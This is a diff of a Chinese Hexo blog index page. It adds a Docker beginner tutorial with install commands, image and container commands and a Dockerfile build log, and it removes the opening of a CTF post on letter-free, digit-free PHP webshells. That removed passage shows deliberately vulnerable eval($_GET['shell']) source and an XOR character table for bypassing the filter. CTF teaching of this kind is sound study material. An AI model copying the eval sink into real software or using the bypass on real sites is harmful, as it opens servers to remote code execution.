@@ -165,6 +165,139 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/12/22/Docker%E7%9A%84%E4%B8%AD%E5%A4%AE%E4%BB%93%E5%BA%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="zoey">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zoey">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/22/Docker%E7%9A%84%E4%B8%AD%E5%A4%AE%E4%BB%93%E5%BA%93/" class="post-title-link" itemprop="url">初识docker</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-22 23:47:03" itemprop="dateCreated datePublished" datetime="2020-12-22T23:47:03+08:00">2020-12-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-12-23 14:04:47" itemprop="dateModified" datetime="2020-12-23T14:04:47+08:00">2020-12-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Docker的思想"><a href="#Docker的思想" class="headerlink" title="Docker的思想"></a>Docker的思想</h3><p><img src="https://zhuang-yongyi.gitee.io/yoyo/12.png"></p>
+<h4 id="集装箱"><a href="#集装箱" class="headerlink" title="集装箱"></a>集装箱</h4><p>会将所有需要的内容放到不同的集装箱中，谁需要这些环境就直接拿到这个集装箱就可以了。</p>
+<h4 id="标准化"><a href="#标准化" class="headerlink" title="标准化"></a>标准化</h4><p>运输的标准化：Docker有一个码头，所有上传的集装箱都放在了这个码头上，当谁需要某一个环境，就直接到码头搬运这个集装箱即可。</p>
+<p>命令的标准化：Docker提供了一些标准化命令，帮助我们去获取集装箱等等操作。</p>
+<p>提供了REST的API：衍生出了很多的图形化界面，例：Rancher</p>
+<h4 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h4><p>Docker在运行集装箱的时候，会在Linux的内核中，单独的开辟一片空间，这片空间不会影响到其他程序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注册中心（超级码头，上面放的就是集装箱）</span><br><span class="line">镜像（集装箱）</span><br><span class="line">容器（运行起来的镜像）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">镜像，就是面向对象中的类，相当于一个模板。</span><br><span class="line">容器，就是类创建的实例，就是依据镜像这个模板创建出来的实体。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Docker的基本操作"><a href="#Docker的基本操作" class="headerlink" title="Docker的基本操作"></a>Docker的基本操作</h3><h4 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1，下载安装Docker的依赖环境</span><br><span class="line">yum -y install yum-utils device-mapper-persistent-mapper-persistent-data lvm2</span><br><span class="line">2，设置一下下载Docker的镜像源</span><br><span class="line">yum-config-manager --add-repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo</span><br><span class="line">3,安装Docker</span><br><span class="line">yum makacache fast</span><br><span class="line">yum -y install docker-ce</span><br><span class="line"></span><br><span class="line">4，启动，并设置为开机自动启动，测试</span><br><span class="line">启动Docker服务</span><br><span class="line">systemctl start docker</span><br><span class="line">设置开机自动启动</span><br><span class="line">systemctl enable docker</span><br><span class="line">测试</span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
+
+<h3 id="Docker的中央仓库"><a href="#Docker的中央仓库" class="headerlink" title="Docker的中央仓库"></a>Docker的中央仓库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1,Docker官方的中央仓库，这个仓库是镜像最全的，但是下载速度较慢</span><br><span class="line">https:&#x2F;&#x2F;hub.docker.com&#x2F;</span><br><span class="line">2,国内的镜像网站：网易蜂巢，daoCloud</span><br><span class="line">http:&#x2F;&#x2F;c.163yun.com&#x2F;hub#&#x2F;home</span><br><span class="line">http:&#x2F;&#x2F;hub.daocloud.io&#x2F;</span><br><span class="line">3,在公司内部会采用私服的方式拉取镜像</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">需要在&#x2F;etc&#x2F;docker&#x2F;demon.json</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;:[&quot;https:&#x2F;&#x2F;registry.docker-cn.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="镜像（集装箱）的操作"><a href="#镜像（集装箱）的操作" class="headerlink" title="镜像（集装箱）的操作"></a>镜像（集装箱）的操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1,拉取镜像到本地</span><br><span class="line">docker pull 镜像名称</span><br><span class="line">举个例子</span><br><span class="line">docker pull daocloud.io&#x2F;library&#x2F;tomcat:8.5.15-jre8</span><br><span class="line"></span><br><span class="line">2，查看全部本地镜像</span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line">3,删除本地文件</span><br><span class="line">docker rmi 镜像的标识（前面两个字母）</span><br><span class="line"></span><br><span class="line">4，镜像的导入导出（不规范）</span><br><span class="line">将本地的镜像导入</span><br><span class="line">docker save -o 导出的路径 镜像id</span><br><span class="line"></span><br><span class="line">加载本地的镜像文件</span><br><span class="line">docker load -i 镜像文件</span><br><span class="line"></span><br><span class="line">修改镜像名称</span><br><span class="line">docker tag 镜像id 新镜像名称：版本</span><br></pre></td></tr></table></figure>
+
+<h3 id="容器的操作（运行起来的镜像）"><a href="#容器的操作（运行起来的镜像）" class="headerlink" title="容器的操作（运行起来的镜像）"></a>容器的操作（运行起来的镜像）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">运行容器</span><br><span class="line">简单操作</span><br><span class="line">docker run 镜像的标识  镜像名称 [:tag]</span><br><span class="line">-d:代表后台运行容器</span><br><span class="line">-p:宿主机端口：容器端口：为了映射当前Linux的端口和容器的端口</span><br><span class="line">--name:容器名称：指定容器的名称</span><br><span class="line"></span><br><span class="line">docker run -d -p 宿主机端口：容器端口  --name  容器名称  镜像的标识|镜像名称[:tag]</span><br><span class="line">例：docker run -d -p 8081：8080  --name  b8</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps 查看正在运行的容器</span><br><span class="line">docker -a  查看全部的容器，包括没有运行</span><br><span class="line">docker -q  只查看容器得到标识</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看容器的日志</span><br><span class="line">docker logs -f 容器id</span><br><span class="line">-f ：可以滚动查看日志的最后几行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入到容器内部</span><br><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">删除容器(删除容器前，需要先停止容器)</span><br><span class="line"></span><br><span class="line">docker stop 容器id  停止指定的容器</span><br><span class="line">docker stop $(docker ps -qa)停止全部容器</span><br><span class="line"></span><br><span class="line">docker rm 镜像id  删除指定容器</span><br><span class="line">docker rm $(docker ps -qa)  删除全部容器</span><br></pre></td></tr></table></figure>
+
+<h3 id="Docker自定义镜像"><a href="#Docker自定义镜像" class="headerlink" title="Docker自定义镜像"></a>Docker自定义镜像</h3><p>中央仓库上的镜像，也是Docker的用户自己上传过去的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1,创建一个Dockerfile的文件，并且指定自定义镜像信息。</span><br><span class="line">Dockerfile文件中常用的内容</span><br><span class="line">from:指定当前自定义镜像依赖的环境</span><br><span class="line">copy:将相对路径下的内容复制到自定义的镜像中</span><br><span class="line">workdir:声明镜像的默认工作目录</span><br><span class="line">cmd:需要执行的命令（在workdir下执行的，cmd可以写多个，以最后一个为准）</span><br></pre></td></tr></table></figure>
+
+<p>镜像就是上面说的集装箱,仓库就是超级码头,容器就是我们运行程序的地方.docker运行程序的过程就是去仓库把镜像拉到本地,然后用一条命令把镜像运行起来变成容器.</p>
+<p>build:构建,就是构建镜像.</p>
+<p>ship:运输,运输镜像,从仓库和主机运输.</p>
+<p>run:运行的镜像就是一个容器.</p>
+<p>build,ship,run和镜像,仓库,容器是一一对应的.</p>
+<h3 id="DockerFile的构建过程"><a href="#DockerFile的构建过程" class="headerlink" title="DockerFile的构建过程"></a>DockerFile的构建过程</h3><p><strong>基础知识：</strong></p>
+<p>1，每个保留关键字（指令）都是必须是大写字母</p>
+<p>2，执行从上到下顺序执行</p>
+<p>3，#表示注释</p>
+<p>4，每一个指令都会创建提交一个新的镜像层，并提交</p>
+<p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1982640279,3003728739&fm=26&gp=0.jpg"></p>
+<p><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=3110578388,151041081&fm=26&gp=0.jpg"></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1,编写自己的Dockfile文件</span></span><br><span class="line"><span class="keyword">FROM</span>  centos</span><br><span class="line"><span class="keyword">MAINTAINER</span> zoey&lt;<span class="number">2793988587</span>@qq.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$MYPATH</span></span></span><br><span class="line"></span><br><span class="line">RUM yum -y install vim</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2，通过这个文件构建镜像</span></span><br><span class="line">docker bulid -f dockerfile文件路径 -t 创建的镜像名:[tag] .</span><br><span class="line"></span><br><span class="line"><span class="comment">#3，测试运行</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">[root@iz88m0zba2pfzdz dockerfile]<span class="comment"># docker build -f mydocker -t mycentos:0.1 .</span></span><br><span class="line">Sending build context to Docker daemon  <span class="number">27.65</span>kB</span><br><span class="line">Step <span class="number">1</span>/<span class="number">8</span> : <span class="keyword">FROM</span>  centos                   <span class="comment">#执行dockerfile第一行</span></span><br><span class="line">latest: Pulling <span class="keyword">from</span> library/centos       <span class="comment">#拉取官方的centos镜像</span></span><br><span class="line"><span class="number">7</span>a0437f04f83: Pull complete </span><br><span class="line">Digest: sha256:<span class="number">5528</span>e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1</span><br><span class="line">Status: Downloaded newer image for centos:latest</span><br><span class="line"> ---&gt; <span class="number">300</span>e315adb2f</span><br><span class="line">Step <span class="number">2</span>/<span class="number">8</span> : <span class="keyword">MAINTAINER</span> zoey&lt;<span class="number">2793988587</span>@qq.com&gt;</span><br><span class="line"> ---&gt; Running in <span class="number">6</span>fed6811727f</span><br><span class="line">Removing intermediate container <span class="number">6</span>fed6811727f</span><br><span class="line"> ---&gt; <span class="number">428884</span>ab35bb</span><br><span class="line">Step <span class="number">3</span>/<span class="number">8</span> : <span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"> ---&gt; Running in e3f315c1c37c</span><br><span class="line">Removing intermediate container e3f315c1c37c</span><br><span class="line"> ---&gt; ddbb9ad846b0</span><br><span class="line">Step <span class="number">4</span>/<span class="number">8</span> : <span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$MYPATH</span></span></span><br><span class="line"> ---&gt; Running in <span class="number">35</span>a1e3ceba27</span><br><span class="line">Removing intermediate container <span class="number">35</span>a1e3ceba27</span><br><span class="line"> ---&gt; d7d770769889</span><br><span class="line">Step <span class="number">5</span>/<span class="number">8</span> : <span class="keyword">RUN</span><span class="bash"> yum -y install vim          <span class="comment">#下载vim</span></span></span><br><span class="line"> ---&gt; Running in f119b2fc3459</span><br><span class="line">CentOS Linux <span class="number">8</span> - AppStream                      <span class="number">2.2</span> MB/s | <span class="number">6.3</span> MB     <span class="number">00</span>:<span class="number">02</span>    </span><br><span class="line">CentOS Linux <span class="number">8</span> - BaseOS                         <span class="number">1.2</span> MB/s | <span class="number">2.3</span> MB     <span class="number">00</span>:<span class="number">01</span>    </span><br><span class="line">CentOS Linux <span class="number">8</span> - Extras                         <span class="number">9.2</span> kB/s | <span class="number">8.6</span> kB     <span class="number">00</span>:<span class="number">00</span>    </span><br><span class="line">Dependencies resolved.</span><br><span class="line"> <span class="keyword">From</span>       : /etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial</span><br><span class="line">Key imported successfully</span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded.</span><br><span class="line">Installed:</span><br><span class="line">  gpm-libs-<span class="number">1.20</span>.<span class="number">7</span>-<span class="number">15</span>.el8.x86_64         vim-common-<span class="number">2</span>:<span class="number">8.0</span>.<span class="number">1763</span>-<span class="number">15</span>.el8.x86_64    </span><br><span class="line">  vim-enhanced-<span class="number">2</span>:<span class="number">8.0</span>.<span class="number">1763</span>-<span class="number">15</span>.el8.x86_64 vim-filesystem-<span class="number">2</span>:<span class="number">8.0</span>.<span class="number">1763</span>-<span class="number">15</span>.el8.noarch</span><br><span class="line">  which-<span class="number">2.21</span>-<span class="number">12</span>.el8.x86_64             </span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">Removing intermediate container f119b2fc3459</span><br><span class="line"> ---&gt; <span class="number">492</span>b0e9bfd9f</span><br><span class="line">Step <span class="number">6</span>/<span class="number">8</span> : <span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"> ---&gt; Running in ea437f060be5</span><br><span class="line">Removing intermediate container ea437f060be5</span><br><span class="line"> ---&gt; <span class="number">7</span>b1ffe6341bf</span><br><span class="line">Step <span class="number">7</span>/<span class="number">8</span> : <span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span></span><br><span class="line"> ---&gt; Running in <span class="number">2</span>a3e3fb9e634</span><br><span class="line">Removing intermediate container <span class="number">2</span>a3e3fb9e634</span><br><span class="line"> ---&gt; cadb8d02b5fc</span><br><span class="line">Step <span class="number">8</span>/<span class="number">8</span> : <span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line"> ---&gt; Running in <span class="number">485</span>a50d91473</span><br><span class="line">Removing intermediate container <span class="number">485</span>a50d91473</span><br><span class="line"> ---&gt; d7dde5695515</span><br><span class="line">Successfully built d7dde5695515</span><br><span class="line">Successfully tagged mycentos:<span class="number">0.1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/11.png" alt="11"></p>
+<h3 id="Docker文件存储"><a href="#Docker文件存储" class="headerlink" title="Docker文件存储"></a>Docker文件存储</h3><p>docker文件存储格式，linux的一个存储技术，叫做联合文件系统，是一种分层的文件系统，可以将不同的目录挂到同一个虚拟文件系统下。</p>
+<p>比如test1下有三个文件夹,test2下有两个文件夹,还有一个readme文件.联合文件系统就是可以在一个文件夹(test)中看到多个文件夹(test1,test2)中的内容.</p>
+<p><img src="https://img-blog.csdnimg.cn/20190525114311818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E2MTAzNzY2ODE=,size_16,color_FFFFFF,t_70"></p>
+<p>docker镜像系统的每一层都是只读的,然后把每一层加载完成之后这些文件都会被看成是同一个目录,相当于只有一个文件系统.docker的这种文件系统被称之为镜像.</p>
+<p><img src="https://img.jbzj.com/file_images/article/201905/2019052011592426.jpg"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/12/21/%E6%B5%85%E6%9E%90CTF%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1035,139 +1168,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/11/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E5%9F%BA%E7%A1%80/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="zoey">
-      <meta itemprop="description" content="Hello!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zoey">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">无字母数字webshell基础</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-11-01 16:30:06" itemprop="dateCreated datePublished" datetime="2020-11-01T16:30:06+08:00">2020-11-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-11-03 19:22:37" itemprop="dateModified" datetime="2020-11-03T19:22:37+08:00">2020-11-03</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>4.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>无字母数字webshell简单来说就是payload中不能出现字母，数字（有些题目还有其他一些过滤），通过异或取反等方法取得flag。</p>
-<h3 id="测试源码"><a href="#测试源码" class="headerlink" title="测试源码"></a>测试源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果shell中不还有字母和数字，则可以执行eval语句</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><p>异或的符号是<code>^</code>,是一种运算符。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 ^ 1 &#x3D; 0</span><br><span class="line">1 ^ 0 &#x3D; 1</span><br><span class="line">0 ^ 1 &#x3D; 1</span><br><span class="line">0 ^ 0 &#x3D; 0</span><br></pre></td></tr></table></figure>
-
-<h4 id="异或脚本"><a href="#异或脚本" class="headerlink" title="异或脚本"></a>异或脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">128</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&quot;%s^%s&quot;</span>,urlencode(chr($i)),urlencode(chr(<span class="number">255</span>))).<span class="string">&quot;=&gt;&quot;</span>. (chr($i)^chr(<span class="number">255</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>运行该脚本我们知道</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">%81^%FF&#x3D;&gt;~     %82^%FF&#x3D;&gt;&#125;       %83^%FF&#x3D;&gt;|</span><br><span class="line">%84^%FF&#x3D;&gt;&#123;     %85^%FF&#x3D;&gt;z       %86^%FF&#x3D;&gt;y</span><br><span class="line">%87^%FF&#x3D;&gt;x     %88^%FF&#x3D;&gt;w       %89^%FF&#x3D;&gt;v</span><br><span class="line">%8A^%FF&#x3D;&gt;u     %8B^%FF&#x3D;&gt;t       %8C^%FF&#x3D;&gt;s</span><br><span class="line">%8D^%FF&#x3D;&gt;r     %8E^%FF&#x3D;&gt;q       %8F^%FF&#x3D;&gt;p</span><br><span class="line">%90^%FF&#x3D;&gt;o     %91^%FF&#x3D;&gt;n       %92^%FF&#x3D;&gt;m</span><br><span class="line">%93^%FF&#x3D;&gt;l     %94^%FF&#x3D;&gt;k       %95^%FF&#x3D;&gt;j</span><br><span class="line">%96^%FF&#x3D;&gt;i     %97^%FF&#x3D;&gt;h       %98^%FF&#x3D;&gt;g</span><br><span class="line">%99^%FF&#x3D;&gt;f     %9A^%FF&#x3D;&gt;e       %9B^%FF&#x3D;&gt;d</span><br><span class="line">%9C^%FF&#x3D;&gt;c     %9D^%FF&#x3D;&gt;b       %9E^%FF&#x3D;&gt;a</span><br><span class="line">%9F^%FF&#x3D;&gt;&#96;     %A0^%FF&#x3D;&gt;_       %A1^%FF&#x3D;&gt;^</span><br><span class="line">%A2^%FF&#x3D;&gt;]     %A3^%FF&#x3D;&gt;\       %A4^%FF&#x3D;&gt;[</span><br><span class="line">%A5^%FF&#x3D;&gt;Z     %A6^%FF&#x3D;&gt;Y       %A7^%FF&#x3D;&gt;X</span><br><span class="line">%A8^%FF&#x3D;&gt;W     %A9^%FF&#x3D;&gt;V       %AA^%FF&#x3D;&gt;U</span><br><span class="line">%AB^%FF&#x3D;&gt;T     %AC^%FF&#x3D;&gt;S       %AD^%FF&#x3D;&gt;R    </span><br><span class="line">%AE^%FF&#x3D;&gt;Q     %AF^%FF&#x3D;&gt;P       %B0^%FF&#x3D;&gt;O</span><br><span class="line">%B1^%FF&#x3D;&gt;N     %B2^%FF&#x3D;&gt;M       %B3^%FF&#x3D;&gt;L</span><br><span class="line">%B4^%FF&#x3D;&gt;K     %B5^%FF&#x3D;&gt;J       %B6^%FF&#x3D;&gt;I</span><br><span class="line">%B7^%FF&#x3D;&gt;H     %B8^%FF&#x3D;&gt;G       %B9^%FF&#x3D;&gt;F</span><br><span class="line">%BA^%FF&#x3D;&gt;E     %BB^%FF&#x3D;&gt;D       %BC^%FF&#x3D;&gt;C</span><br><span class="line">%BD^%FF&#x3D;&gt;B     %BE^%FF&#x3D;&gt;A       %BF^%FF&#x3D;&gt;@</span><br><span class="line">%C0^%FF&#x3D;&gt;?</span><br></pre></td></tr></table></figure>
-
-<p>通过这种方法构造一个phpinfo()函数</p>
